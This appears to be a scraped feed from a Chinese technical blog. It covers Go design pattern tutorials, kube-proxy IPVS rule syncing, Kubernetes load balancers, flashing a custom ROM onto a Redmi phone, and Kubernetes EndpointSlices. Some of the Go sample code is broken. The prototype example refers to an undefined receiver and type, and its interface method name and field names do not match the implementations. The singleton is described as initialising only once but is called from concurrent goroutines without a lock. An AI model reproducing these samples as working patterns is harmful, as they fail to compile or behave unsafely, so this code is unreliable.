（例如暖气，排水系统，供电系统，冷气系统）。\n在这种场景下，建造者模式就应景而生，Builder 建议将对象构造代码从产品类中抽取出来， 并将其放在一个名为 Builder 的独立对象中。\n图：Builder示意图/center\u003e Source：https://www.techcrashcourse.com/2015/10/abstract-factory-design-pattern.html\n在这种情况下， 通过创建多个不同的Builder， 用不同方式实现一组相同的创建步骤。 然后你就可以在创建过程中使用这些Builder （例如按顺序调用多个构造步骤） 来生成不同类型的对象。\n代码实现 Builder interface\ntype IBuilder interface { setWindowType() setDoorType() setNumFloor() getHouse() House } func getBuilder(builderType string) IBuilder { if builderType == \u0026quot;normal\u0026quot; { return newNormalBuilder() } if builderType == \u0026quot;igloo\u0026quot; { return newIglooBuilder() } return nil } 一般房屋\npackage main type NormalBuilder struct { windowType string doorType string floor int } func newNormalBuilder() *NormalBuilder { return \u0026amp;NormalBuilder{} } func (b *NormalBuilder) setWindowType() { b.windowType = \u0026quot;Wooden Window\u0026quot; } func (b *NormalBuilder) setDoorType() { b.doorType = \u0026quot;Wooden Door\u0026quot; } func (b *NormalBuilder) setNumFloor() { b.floor = 2 } func (b *NormalBuilder) getHouse() House { return House{ doorType: b.doorType, windowType: b.windowType, floor: b.floor, } } 冰屋\ntype IglooBuilder struct { windowType string doorType string floor int } func newIglooBuilder() *IglooBuilder { return \u0026amp;IglooBuilder{} } func (b *IglooBuilder) setWindowType() { b.windowType = \u0026quot;Snow Window\u0026quot; } func (b *IglooBuilder) setDoorType() { b.doorType = \u0026quot;Snow Door\u0026quot; } func (b *IglooBuilder) setNumFloor() { b.floor = 1 } func (b *IglooBuilder) getHouse() House { return House{ doorType: b.doorType, windowType: b.windowType, floor: b.floor, } } 房屋属性\npackage main type House struct { windowType string doorType string floor int } 工人\ntype Worker struct { builder IBuilder } func newWorker(b IBuilder) *Worker { return \u0026amp;Worker{ builder: b, } } func (d *Worker) setBuilder(b IBuilder) { d.builder = b } func (d *Worker) buildHouse() House { d.builder.setDoorType() d.builder.setWindowType() d.builder.setNumFloor() return d.builder.getHouse() } 客户端代码实现，即建造房屋\nfunc main() { // 定义房屋的类型 normalBuilder := getBuilder(\u0026quot;normal\u0026quot;) iglooBuilder := getBuilder(\u0026quot;igloo\u0026quot;) // 请工人盖房子 worker := newWorker(normalBuilder) normalHouse := worker.buildHouse() // 设置工人需要施工的方向，即要盖什么类型的房子 fmt.Printf(\u0026quot;Normal House Door Type: %s\\n\u0026quot;, normalHouse.doorType) fmt.Printf(\u0026quot;Normal House Window Type: %s\\n\u0026quot;, normalHouse.windowType) fmt.Printf(\u0026quot;Normal House Num Floor: %d\\n\u0026quot;, normalHouse.floor) worker.setBuilder(iglooBuilder) iglooHouse := worker.buildHouse() fmt.Printf(\u0026quot;\\nIgloo House Door Type: %s\\n\u0026quot;, iglooHouse.doorType) fmt.Printf(\u0026quot;Igloo House Window Type: %s\\n\u0026quot;, iglooHouse.windowType) fmt.Printf(\u0026quot;Igloo House Num Floor: %d\\n\u0026quot;, iglooHouse.floor) } prototype 模式概念 prototype 这种设计模式，提供的是一种复制现有对象的模式，在这种模式下不需要重复的构建对象。\nprototype 的特点有：\n客户端代码克隆对象时，客户端并不知道它获得的对象类型，而需要指定其对象类型 提高了系统性能；对于资源密集型操作的对象，可以通过克隆来减少创建成本 隐藏了客户端代码创建新示例的复杂性 该类型主要的体系就是在clone() 上 选择 prototype的场景\n当创建对象很复杂时，或需要大量的资源操作时 当想对客户端隐藏创建逻辑时 当一个类有多种状态，可以通过先全部创建，用时克隆来提高效率 代码的实现 brid.go\ntype Brid interface { fly() Clone() Brid } Owl.go\ntype Owl struct{ Name string } func (g *Owl) fly() { fmt.Printf(\u0026quot;猫头鹰 %s 在飞\\n\u0026quot;, g.Name) } func (g *Owl) clone() Brid { return \u0026amp;Owl{Name: g.Name} } func newOwl() Brid { return \u0026amp;Owl{} } Eagle.go\ntype Eagle struct{ Name string } func (e *Eagle) fly() { fmt.Printf(\u0026quot;鹰 %s 在飞\\n\u0026quot;, e.Name) } func (g *Eagle) clone() Brid { return \u0026amp;Eagle{Name: g.Name} } func newEagle() Brid { return \u0026amp;Eagle{} } Sparrow.go\ntype Sparrow struct{ Name string } func (e *Sparrow) fly() { fmt.Printf(\u0026quot;麻雀 %s 在飞\\n\u0026quot;, e.Name) } func (g *Sparrow) clone() Brid { return \u0026amp;Sparrow{Name: g.Name} } func newSparrow() Brid { return \u0026amp;Sparrow{} } prototype 类，使用 BridsFactory 对象来创建 Parrot、Sparrow 和 Eagle 等类的对象。\ntype BridsFactory struct { children []Brid name string } func (b *BridsFactory) print(indentation string) { fmt.Println(indentation + b.name) for _, i := range f.children { i.fly() } } func (b *BridsFactory) clone() BridsFactory { clonBrid := \u0026amp;Brids{name: b.name + \u0026quot;_clone\u0026quot;} var tempChildren []Brid for _, i := range f.children { copy := i.clone() tempChildren = append(tempChildren, copy) } clonBrid.children = tempChildren return clonBrid } 客户端代码\nfunc main() { brid1 := \u0026amp;Owl{name: \u0026quot;jackchan\u0026quot;} brid2 := \u0026amp;Eagle{name: \u0026quot;calenlee\u0026quot;} brid3 := \u0026amp;Sparrow{name: \u0026quot;jerrywong\u0026quot;} brids1 := \u0026amp;BridsFactory{ children: []Brid{brid1, brid2, brid3}, name: \u0026quot;owls\u0026quot;, } cloneBrids := brids1.clone() fmt.Println(\u0026quot;\\nPrinting hierarchy for clone Brids\u0026quot;) cloneBrids.print(\u0026quot; \u0026quot;) } 单例 概念说明 单例 (Singleton) 模式主要特点是确保一个类只能创建一个对象，其提供了一种只能创建一个对象的方法。\n单例模式的特点:\n确保一个类只能创建的一个实例 通常情况下构造函数是私有的，以防止通过new来创建多个实例 类似静态的构建函数的方法，它将提供了一种调用私有构建函数来创建出对象并保存在静态字段中，后续所有的构建调用都会返回唯一的这个静态对象 代码实现 type single struct {} var singleInstance *single // 定义一个静态字段 func getInstance() *single { if singleInstance == nil { // 当这个“静态变量”为空时，则创建这个对象，已确保只能被初始化一次 if singleInstance == nil { fmt.Println(\u0026quot;Creating single instance now.\u0026quot;) singleInstance = \u0026amp;single{} } else { fmt.Println(\u0026quot;Single instance already created.\u0026quot;) } } else { fmt.Println(\u0026quot;Single instance already created.\u0026quot;) } return singleInstance } 客户端代码\nfunc main() { for i := 0; i \u0026lt; 30; i++ { go getInstance() } } 结构模式 适配器 适配器设计模式 (Adapter)，是一种结构设计模式，主要是使具有不兼容接口的对象可以进行协作；通俗来讲，是将一个类的接口转换为客户端期望的另一个接口，可以使不兼容的两个类通过 适配器，完成与现有类的交互。\nAdapter 将作为一个 “代理人” 的职责\n适配器模式特点：\n使不兼容的类可以通过Adapter进行交互 提升了现有系统的可用性（一个类可以使多个类使用） 很常见的一个例子，数据使一个结构体，而客户端需要 json, 那么 Adapter 就可以是 json.Marshual\n适配器模式的组成 Target Interface：客户端期望的数据格式，即客户端使用的类型 Adapter: 接收来自客户端的调用，假设服务端类型是 Adaptee，他会将客户端的调用转换为Adaptee 类型 Adaptee Interface: 实际的类型，客户端想与其交互，由于类型不相同无法直接请求 Client: 客户端使用 Target Interface 与 Adapter 交互 代码示例 例如我们有一个Windows电脑来作为 Adaptee Interface，电脑上有各类的接口，例如USB，这两种类型是不同的，这时就需要 Adapter\nclient.go\ntype Client struct {} func (c *Client) InsertLightningConnectorIntoComputer(com Computer) { fmt.Println(\u0026quot;Client inserts Lightning connector into computer.\u0026quot;) com.InsertIntoLightningPort() } Client interface 为Computer配置一个雷电接口\ntype Computer interface { InsertIntoLightningPort() } Mac PC 实现了Computer接口，这样客户端与服务端可以直接通讯\ntype Mac struct {} func (m *Mac) InsertIntoLightningPort() { fmt.Println(\u0026quot;Lightning connector is plugged into mac machine.\u0026quot;) } windows PC 没有实现 Computer 接口，\ntype Windows struct{} func (w *Windows) insertIntoUSBPort() { fmt.Println(\u0026quot;USB connector is plugged into windows machine.\u0026quot;) } 要使 windows 也可以 使用 Lightning，那么需要适配器\ntype WindowsAdapter struct { windowMachine *Windows } func (w *WindowsAdapter) InsertIntoLightningPort() { fmt.Println(\u0026quot;Adapter converts Lightning signal to USB.\u0026quot;) w.windowMachine.insertIntoUSBPort() } 客户端代码\npackage main func main() { client := \u0026amp;Client{} mac := \u0026amp;Mac{} client.InsertLightningConnectorIntoComputer(mac) windowsMachine := \u0026amp;Windows{} windowsMachineAdapter := \u0026amp;WindowsAdapter{ windowMachine: windowsMachine, } client.InsertLightningConnectorIntoComputer(windowsMachineAdapter) } Bridge 桥接 (Bridge) 允许将大类拆分为两个独立的层次结构（abstraction 和 implementation），桥接模式提供一个接口，来充当两个层次间的桥梁\n桥接模式的特点：\n","permalink":"https://www.oomkill.com/2023/03/design-patterns/","summary":"","title":"Go设计模式"},{"content":" 前景 这里谈 kube-proxy 如何保证规则的一致性以及提升 kube-proxy 性能点的地方，这也是 kubernetes 使用稳定性的一部分。\nkube-proxy 如何做到的CRUD kube-proxy 实际上与其他内置 controller 架构是相同的，实际上也属于一个 controller ，但它属于一个 service, endpoints 的可读可写的控制器，node的读控制器。对于CRUD方面，kube-proxy，在设计上分为 增/改 两方面。正如下面代码所示 pkg/proxy/ipvs/proxier.go\nfunc (proxier *Proxier) OnServiceAdd(service *v1.Service) { proxier.OnServiceUpdate(nil, service) } // OnServiceUpdate is called whenever modification of an existing service object is observed. func (proxier *Proxier) OnServiceUpdate(oldService, service *v1.Service) { if proxier.serviceChanges.Update(oldService, service) \u0026amp;\u0026amp; proxier.isInitialized() { proxier.Sync() } } // OnServiceDelete is called whenever deletion of an existing service object is observed. func (proxier *Proxier) OnServiceDelete(service *v1.Service) { proxier.OnServiceUpdate(service, nil) } 可以看到代码最终调用的都是 OnServiceUpdate，最终 调用的是 proxier.Sync()。对于 Sync()，这里会调用在 Proxier 初始化时注入的那个函数，而 Sync() 本质上是 一个异步有限的函数管理器，这里将实现两个方面，一是，定时去触发执行这个函数；二是满足规则去触发这个函数；而 Sync() 属于条件2\n对于注入的函数，则是 proxier.syncProxyRules ，由下列代码可以看到\nproxier.syncRunner = async.NewBoundedFrequencyRunner(\u0026quot;sync-runner\u0026quot;, proxier.syncProxyRules, minSyncPeriod, syncPeriod, burstSyncs) 这样就是说，kube-proxy 通过 syncProxyRules 实现了整个 service 与 endpoint 的增删改查\n性能提升点1 由上面有限的函数管理器 runner，可以作为性能提升点，而该runner初始化时提供了minSyncPeriod, syncPeriod 两个函数，这两个函数代表的意思为，minSyncPeriod是runner允许你在最小多少时间内可以调用，如果你的集群规模大，那么则可以适当配置该参数小写，因为service的频繁更改会被这个参数限制。\n如何通过一个函数做CRUD 对于增改，存在三个资源，ClusterIP, NodePort, Ingress,当这些资源被触发时，会同步这个service与endpoint，如代码所示 syncProxyRules\nif err := proxier.syncService(svcNameString, serv, true, bindedAddresses); err == nil { activeIPVSServices[serv.String()] = true activeBindAddrs[serv.Address.String()] = true if err := proxier.syncEndpoint(svcName, svcInfo.OnlyNodeLocalEndpoints(), serv); err != nil { klog.Errorf(\u0026quot;Failed to sync endpoint for service: %v, err: %v\u0026quot;, serv, err) } } else { klog.Errorf(\u0026quot;Failed to sync service: %v, err: %v\u0026quot;, serv, err) } 由上面代码可知，所有的 service 与 endpoint 的更新，都会触发 Sync()，而 Sync() 执行的是 syncProxyRules() ，当service有变动时，就会通过 syncService/syncEndpoint 进行同步\n而对于删除动作来说，kube-proxy 提供了 cleanLegacyService 函数在变动做完时，进行清理遗留的service规则，如下列代码所示。\nproxier.cleanLegacyService(activeIPVSServices, currentIPVSServices, legacyBindAddrs) 并且通过两个数组来维护两个 activeIPVSServices , 与 currentIPVSServices 为主，来维护删除的数据\nCRUD实际实现 上面了解到了删除与添加的逻辑，下面分析这些是如何进行的\n当添加被触发时，会触发 proxier.syncService() ，首先会进行本机上ipvs规则是否存在这个规则，存在则更改，而后返回一个 error, 这个 error 取决于是否更新 endpoints，如下列代码所示\nfunc (proxier *Proxier) syncService(svcName string, vs *utilipvs.VirtualServer, bindAddr bool, bindedAddresses sets.String) error { appliedVirtualServer, _ := proxier.ipvs.GetVirtualServer(vs) if appliedVirtualServer == nil || !appliedVirtualServer.Equal(vs) { if appliedVirtualServer == nil { // IPVS service is not found, create a new service klog.V(3).Infof(\u0026quot;Adding new service %q %s:%d/%s\u0026quot;, svcName, vs.Address, vs.Port, vs.Protocol) if err := proxier.ipvs.AddVirtualServer(vs); err != nil { klog.Errorf(\u0026quot;Failed to add IPVS service %q: %v\u0026quot;, svcName, err) return err } } else { // IPVS service was changed, update the existing one // During updates, service VIP will not go down klog.V(3).Infof(\u0026quot;IPVS service %s was changed\u0026quot;, svcName) if err := proxier.ipvs.UpdateVirtualServer(vs); err != nil { klog.Errorf(\u0026quot;Failed to update IPVS service, err:%v\u0026quot;, err) return err } } } // bind service address to dummy interface if bindAddr { // always attempt to bind if bindedAddresses is nil, // otherwise check if it's already binded and return early if bindedAddresses != nil \u0026amp;\u0026amp; bindedAddresses.Has(vs.Address.String()) { return nil } klog.V(4).Infof(\u0026quot;Bind addr %s\u0026quot;, vs.Address.String()) _, err := proxier.netlinkHandle.EnsureAddressBind(vs.Address.String(), DefaultDummyDevice) if err != nil { klog.Errorf(\u0026quot;Failed to bind service address to dummy device %q: %v\u0026quot;, svcName, err) return err } } return nil } 接下来通过后会 触发 proxier.syncEndpoint() 这里传入了当前的 service, 这里是为了与 IPVS 概念相吻合，如IPVS 中存在 RealServers/VirtualServers，首先会拿到本机这个VirtualServer下的所有RealServer，而后进行添加，而后对比 传入的 Endpoints 列表 与 本机这个VirtualServer下的所有RealServer，不相等的则被删除；删除的动作是一个异步操作。由 gracefuldeleteManager 维护\nfunc (proxier *Proxier) syncEndpoint(svcPortName proxy.ServicePortName, onlyNodeLocalEndpoints bool, vs *utilipvs.VirtualServer) error { appliedVirtualServer, err := proxier.ipvs.GetVirtualServer(vs) if err != nil || appliedVirtualServer == nil { klog.Errorf(\u0026quot;Failed to get IPVS service, error: %v\u0026quot;, err) return err } // curEndpoints represents IPVS destinations listed from current system. curEndpoints := sets.NewString() // newEndpoints represents Endpoints watched from API Server. newEndpoints := sets.NewString() curDests, err := proxier.ipvs.GetRealServers(appliedVirtualServer) if err != nil { klog.Errorf(\u0026quot;Failed to list IPVS destinations, error: %v\u0026quot;, err) return err } for _, des := range curDests { curEndpoints.Insert(des.String()) } endpoints := proxier.endpointsMap[svcPortName] // Service Topology will not be enabled in the following cases: // 1. externalTrafficPolicy=Local (mutually exclusive with service topology). // 2. ServiceTopology is not enabled. // 3. EndpointSlice is not enabled (service topology depends on endpoint slice // to get topology information). if !onlyNodeLocalEndpoints \u0026amp;\u0026amp; utilfeature.DefaultFeatureGate.Enabled(features.ServiceTopology) \u0026amp;\u0026amp; utilfeature.DefaultFeatureGate.Enabled(features.EndpointSliceProxying) { endpoints = proxy.FilterTopologyEndpoint(proxier.nodeLabels, proxier.serviceMap[svcPortName].TopologyKeys(), endpoints) } for _, epInfo := range endpoints { if onlyNodeLocalEndpoints \u0026amp;\u0026amp; !epInfo.GetIsLocal() { continue } newEndpoints.Insert(epInfo.String()) } // Create new endpoints for _, ep := range newEndpoints.List() { ip, port, err := net.SplitHostPort(ep) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint: %v, error: %v\u0026quot;, ep, err) continue } portNum, err := strconv.Atoi(port) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint port %s, error: %v\u0026quot;, port, err) continue } newDest := \u0026amp;utilipvs.RealServer{ Address: net.ParseIP(ip), Port: uint16(portNum), Weight: 1, } if curEndpoints.Has(ep) { // check if newEndpoint is in gracefulDelete list, if true, delete this ep immediately uniqueRS := GetUniqueRSName(vs, newDest) if !proxier.gracefuldeleteManager.InTerminationList(uniqueRS) { continue } klog.V(5).Infof(\u0026quot;new ep %q is in graceful delete list\u0026quot;, uniqueRS) err := proxier.gracefuldeleteManager.MoveRSOutofGracefulDeleteList(uniqueRS) if err != nil { klog.Errorf(\u0026quot;Failed to delete endpoint: %v in gracefulDeleteQueue, error: %v\u0026quot;, ep, err) continue } } err = proxier.ipvs.AddRealServer(appliedVirtualServer, newDest) if err != nil { klog.Errorf(\u0026quot;Failed to add destination: %v, error: %v\u0026quot;, newDest, err) continue } } // Delete old endpoints for _, ep := range curEndpoints.Difference(newEndpoints).UnsortedList() { // if curEndpoint is in gracefulDelete, skip uniqueRS := vs.String() + \u0026quot;/\u0026quot; + ep if proxier.gracefuldeleteManager.InTerminationList(uniqueRS) { continue } ip, port, err := net.SplitHostPort(ep) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint: %v, error: %v\u0026quot;, ep, err) continue } portNum, err := strconv.Atoi(port) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint port %s, error: %v\u0026quot;, port, err) continue } delDest := \u0026amp;utilipvs.RealServer{ Address: net.ParseIP(ip), Port: uint16(portNum), } klog.V(5).Infof(\u0026quot;Using graceful delete to delete: %v\u0026quot;, uniqueRS) err = proxier.gracefuldeleteManager.GracefulDeleteRS(appliedVirtualServer, delDest) if err != nil { klog.Errorf(\u0026quot;Failed to delete destination: %v, error: %v\u0026quot;, uniqueRS, err) continue } } return nil } 删除 service 将删除所有的 RealServer，这点上面提到过，kube-proxy 通过 cleanLegacyService 进行删除，如下列代码所示\nfunc (proxier *Proxier) cleanLegacyService(activeServices map[string]bool, currentServices map[string]*utilipvs.VirtualServer, legacyBindAddrs map[string]bool) { isIPv6 := utilnet.IsIPv6(proxier.nodeIP) for cs := range currentServices { svc := currentServices[cs] if proxier.isIPInExcludeCIDRs(svc.Address) { continue } if utilnet.IsIPv6(svc.Address) != isIPv6 { // Not our family continue } if _, ok := activeServices[cs]; !ok { klog.V(4).Infof(\u0026quot;Delete service %s\u0026quot;, svc.String()) if err := proxier.ipvs.DeleteVirtualServer(svc); err != nil { klog.Errorf(\u0026quot;Failed to delete service %s, error: %v\u0026quot;, svc.String(), err) } addr := svc.Address.String() if _, ok := legacyBindAddrs[addr]; ok { klog.V(4).Infof(\u0026quot;Unbinding address %s\u0026quot;, addr) if err := proxier.netlinkHandle.UnbindAddress(addr, DefaultDummyDevice); err != nil { klog.Errorf(\u0026quot;Failed to unbind service addr %s from dummy interface %s: %v\u0026quot;, addr, DefaultDummyDevice, err) } else { // In case we delete a multi-port service, avoid trying to unbind multiple times delete(legacyBindAddrs, addr) } } } } } 性能提升点2 由上面的讲解可知，CRUD动作是每一个事件 syncProxyRules 被触发时都会进行执行，而删除动作存在多组循环（如构建维护的两个列表；进行循环删除）即每一次 Endpoints 变动也会触发 大量的 Service 的循环，从而检测 是否由遗留的Service资源，而这个操作保留到kubernetes 1.26版本\n假设你的集群节点是5000个，service资源是两万个，那么当你更新一个Service资源循环的次数，会至少循环多达数万次（Service, EndpointSpilt, currentServices, NodeIP, Ingress）其中无用的为currentServices，因为这个只有在删除Service本身才会有效（如果存在20000个service，其中currentServices在构建与对比的过程超过4万次）\n","permalink":"https://www.oomkill.com/2023/03/ch24-kube-proxy-performance/","summary":"","title":"kube-proxy如何保证规则的一致性"},{"content":"概述 在之前有一个系列提到了扩展proxier，但可能细心的同学注意到，作为一个外部的LB，市场上存在一些开源的为kubernetes集群提供的LB，这不是舍近求远吗？而 Google工程师 Adam Dunstan 的 文章 [1] 对比了这些LB的区别（中文翻译备份 [2] ），例如：\nMetalLB：最流行的 负载均衡控制器 PureLB：新产品 (文章作者 Adam Dunstan 参与了 PureLB的开发工作) OpenELB：相对较新的产品，最初该LB仅关注路由方向 文章提出了一个LB实现的基本目标为：必要的简单网络组件，与可扩展的集群操作\n启动受控的集群service/应用的外部访问 外部资源的预配置 易于整合自动化的工作流程（CI/CD） 那么这些LB与 kube-proxy 甚至于 IPVS/IPTables 有什么区别呢？\n这些LB的核心是为集群service提供一个外部IP，而service功能本身还是由 kube-proxy,IPVS 提供，在这点 MetalLB 介绍中提到了这个问题\nIn layer 2 mode, all traffic for a service IP goes to one node. From there, kube-proxy spreads the traffic to all the service’s pods. [3]\nAfter the packets arrive at the node, kube-proxy is responsible for the final hop of traffic routing, to get the packets to one specific pod in the service. [4]\n通过kubernetes service 资源方向表示，是为EXTERNAL-IP部分分配一个IP地址，而从来不是说内部的LB\n$ kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes ClusterIP 192.168.0.1 \u0026lt;none\u0026gt; 443/TCP 196d 关于MetalLb的使用可以参考视频：Set up MetalLB Load Balancing for Bare Metal Kubernetes\n正如注解所说，工作与L2的模式下，流量会到达一个Node,接下来通过kube-proxy广播至所有的Pod，这种模式下是否可以做到HA，还有待测试。\n接下来提到 Proixer，Proixer是对于集群（内）正常工作的一个保证，最基础的一点则是Kubernetes service 需要每个Pod可以访问到，所以 kube-proxy 则完全不同于 kubernetes LB\n总结 Kubernetes LB是Kubernetes的扩展功能，主要特点体现在下列方面：\nLB 是要作用是为service提供一个外部IP 通常情况下，LB支持的都是 L2, L3 网络，而非传统的L4, L7 LB kube-proxy并不可以被这类LB所替代，因为这类LB的端点是到service 目前开源的 kube-proxy repleacement 应该只有 eBPF Reference\n[1] Kubernetes Ingress 架构说明\n[2] 「译文」比较开源 k8s LoadBalancer-MetalLB vs PureLB vs OpenELB\n[3] METALLB IN LAYER 2 MODE\n[4] METALLB IN BGP MODE\n","permalink":"https://www.oomkill.com/2023/02/kubernetes-lb/","summary":"","title":"扫盲Kubernetes负载均衡 - 从Ingress聊到LB"},{"content":"前言 MIUI13 石锤了内置反诈APP后，我的是MIUI12, 接到公安的私人电话，系统直接弹出国家反诈的弹窗，关键我是印度版的Rom，一身冷汗，估计当局审查是通过系统组件更新了，直接装Pixel Experience，以后换设备永远不换最新的，让网友们踩坑吧\n注：隐私是一种权利，电信诈骗请问 骗子怎么知道我的金融信息，怎么知道我的出入境信息。上海公安10亿信息泄露是怎么情况，当公权力无法保证用户隐私时，请不要实名制，参考韩国。隐私权参考欧洲\n操作 进入fastboot(power button + volume button up)，然后使用数据线连接至PC(windows),然后下载MiFlash 首次弹出时需要安装驱动，以便PC可以识别到手机\n给手机安装TWRP [1]，通过搜索找到你的手机型号 例如 Redmi Note5。(可以去小米ROM网上对照下你的手机代号时什么例如 Note7 Pro 代号为 紫罗兰 violet)\n在下载时TWRP网站上会提示你先安装 Play Stroe(这是包含了adb fastboot等工具的工具包，有的话可以不装) 安装步骤可以参考 [2]\n选择 Wipe – Advance Wipe – 选上 System, Data, Dalvik, Cache 四个擦除\n下载 firmware 与 PixelExperience\n去 https://download.pixelexperience.org/ 下载 PixelExperience 找到自己的手机型号，参考1 去 https://xiaomifirmwareupdater.com/firmware/ 下载 fireware 找到自己的手机型号，参考1 注：建议直接搜代号如violet，搜型号太多不好找 向手机复制 firmware [3] 和固件\nfw_violet_miui_VIOLET_9.9.3_79d3ccd33b_9.0.zip PixelExperience_violet-10.0-20191021-1744-BETA-OFFICIAL.zip 复制命令参考 [10] 按先后顺序安装后，重启就安装好google pixel experience了 enjoy 🤞\n拷贝命令 adb push xxx.zip /sdcard couldn\u0026rsquo;t create file: Required key not available：没有写入权限，换个目录写就行\n对于Win10中进入Fastboot下Bootloader Interface自动断开问题 管理员运行\n@echooff reg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\usbflags\\18D1D00D0100\u0026quot; /v \u0026quot;osvc\u0026quot; /t REG_BINARY /d \u0026quot;0000\u0026quot; /f reg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\usbflags\\18D1D00D0100\u0026quot; /v \u0026quot;SkipContainerIdQuery\u0026quot; /t REG_BINARY /d \u0026quot;01000000\u0026quot; /f reg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\usbflags\\18D1D00D0100\u0026quot; /v \u0026quot;SkipBOSDescriptorQuery\u0026quot; /t REG_BINARY /d \u0026quot;01000000\u0026quot; /f pause twrp operation not permitted redmi 在 https://github.com/Szaki/XiaomiADBFastbootTools 下载对应工具与 jdk 11，安装后运行工具即可，点击 wipe cache and userdata 后就有写入权限了\nReference [1] twrp\n[2] 小米手机刷 TWRP 方法（解决卡米问题）\n[3] 安卓手机在Win10中进入Fastboot下Adb Bootloader Interface自动断开\n[4] Twrp Error Operation not Permitted 2021 Fix\n[5] 红米 Note 7 Pro 刷 Pixel Experience\n","permalink":"https://www.oomkill.com/2023/02/xiaomi-install-pixelexperience/","summary":"","title":"红米手机安装 Pixel Experience"},{"content":"Endpoint Endpoints 就是 service 中后端的server，通常来说 endpoint 与 service是关联的，例如下面的一个endpoints 资源。\napiVersion: v1 kind: Endpoints metadata: name: nginx subsets: - addresses: - ip: 172.17.0.2 - ip: 172.17.0.3 ports: - port: 80 name: \u0026quot;111\u0026quot; # 多个端口需要用name - port: 88 name: \u0026quot;222\u0026quot; 而 Endpoints 资源是由控制平面的 Endpoints controller 进行管理的，主要用于将外部server引入至集群内时使用的，例如Kube-apiserver 在集群外的地址，以及external service所需要创建的。\n我们看到 Endpoints controller 代码中，在对 该 informer 监听的包含 service 与 Pod，位于 NewEndpointController()\n// NewEndpointController returns a new *EndpointController. func NewEndpointController(podInformer coreinformers.PodInformer, serviceInformer coreinformers.ServiceInformer, endpointsInformer coreinformers.EndpointsInformer, client clientset.Interface, endpointUpdatesBatchPeriod time.Duration) *EndpointController { broadcaster := record.NewBroadcaster() broadcaster.StartStructuredLogging(0) broadcaster.StartRecordingToSink(\u0026amp;v1core.EventSinkImpl{Interface: client.CoreV1().Events(\u0026quot;\u0026quot;)}) recorder := broadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: \u0026quot;endpoint-controller\u0026quot;}) if client != nil \u0026amp;\u0026amp; client.CoreV1().RESTClient().GetRateLimiter() != nil { ratelimiter.RegisterMetricAndTrackRateLimiterUsage(\u0026quot;endpoint_controller\u0026quot;, client.CoreV1().RESTClient().GetRateLimiter()) } e := \u0026amp;EndpointController{ client: client, queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \u0026quot;endpoint\u0026quot;), workerLoopPeriod: time.Second, } serviceInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{ AddFunc: e.onServiceUpdate, UpdateFunc: func(old, cur interface{}) { e.onServiceUpdate(cur) }, DeleteFunc: e.onServiceDelete, }) e.serviceLister = serviceInformer.Lister() e.servicesSynced = serviceInformer.Informer().HasSynced podInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{ AddFunc: e.addPod, UpdateFunc: e.updatePod, DeleteFunc: e.deletePod, }) e.podLister = podInformer.Lister() e.podsSynced = podInformer.Informer().HasSynced endpointsInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{ DeleteFunc: e.onEndpointsDelete, }) e.endpointsLister = endpointsInformer.Lister() e.endpointsSynced = endpointsInformer.Informer().HasSynced .... } EndpointSlices [1] EndpointSlices 是提供为集群内用于替换 Endpoints 资源的一种灵活并具有扩展性的一种资源，由控制平面的 EndpointSlices Controller 来创建和管理的，默认情况下 EndpointSlices Controller 创建和管理的EndpointSlices 资源将不大于100个Endpoints；可以通过 kube-controller-manager 的参数 --max-endpoints-per-slice 设置，该参数最大为1000 [2]\n通常情况下无需自行创建该资源，因为在创建 service 资源时 通常是通过 label 来匹配到对应的 backend server\n下面是一个完整的 EndpointSlices 资源清单\naddressType: IPv4 apiVersion: discovery.k8s.io/v1beta1 #注意版本 1.21后是 v1 endpoints: - addresses: - 192.168.1.241 conditions: ready: true targetRef: kind: Pod name: netbox-ff6dd9445-kxr4s namespace: default resourceVersion: \u0026quot;1994535\u0026quot; topology: kubernetes.io/hostname: master-machine - addresses: - 192.168.1.242 conditions: ready: true targetRef: kind: Pod name: netbox-ff6dd9445-566tj namespace: default topology: kubernetes.io/hostname: master-machine kind: EndpointSlice metadata: annotations: endpoints.kubernetes.io/last-change-trigger-time: \u0026quot;2023-02-24T22:40:20+08:00\u0026quot; labels: endpointslice.kubernetes.io/managed-by: endpointslice-controller.k8s.io kubernetes.io/service-name: netbox name: netbox-l489z namespace: default ports: - name: \u0026quot;\u0026quot; port: 80 protocol: TCP 在代码中 EndpointSlices 资源是这么呈现的，可以看到主要的就是包含一组 Endpoints 资源\ntype EndpointSlice struct { metav1.TypeMeta metav1.ObjectMeta AddressType AddressType Endpoints []Endpoint Ports []EndpointPort } EndpointSlices 在 kube-proxy中的应用 Google 工程师 Rob Scott 在2020年一文 [3] 中提到了 EndpointSlices 的作用，从kubernetes 1.19 开始EndpointSlices 默认被开启，而开启后的kube-proxy将使用 EndpointSlices 读取集群内的service的 Endpoints，而这个最大的变化就是『拓扑感知路由』(Topology Aware Routing)\nRob Scott 在文中提到 EndpointSlice API 是为了提升 Endpoints API 的限制，例如，etcd的存储大小，以及pod规模变动时最大产生的超过22TB数据的问题\n而这些问题可以通过文中变化图来说明，开启功能后会将所有匹配到的 Endpoint，划分为多个EndpointSlices，而在大规模集群环境场景下，每次的变更只需要修改其中一个 EndpointSlices 即可，这将带给 kube-proxy 提供超Endpoint模式 10倍的性能\n图：Kubernetes EndpointSlices Source：https://kubernetes.io/blog/2020/09/02/scaling-kubernetes-networking-with-endpointslices\nNotes：该文中没有提到的一点是：”EndpointSlices资源解决的是集群内的service节点问题，如你使用了endpoint类资源，那么不会触发到EndpointSlices的资源，这部分在 kube-proxy 源码中可以很清晰的看到\n下面的 kube-proxy 日志可以看到获取 server是通过 Endpoints 还是 EndpointSlices\nendpointslicecache.go:322] Setting endpoints for \u0026quot;default/netbox\u0026quot; to [192.168.1.241:80 192.168.1.242:80] 10008 proxier.go:1057] Syncing ipvs Proxier rules 10008 iptables.go:343] running iptables-save [-t filter] 10008 iptables.go:343] running iptables-save [-t 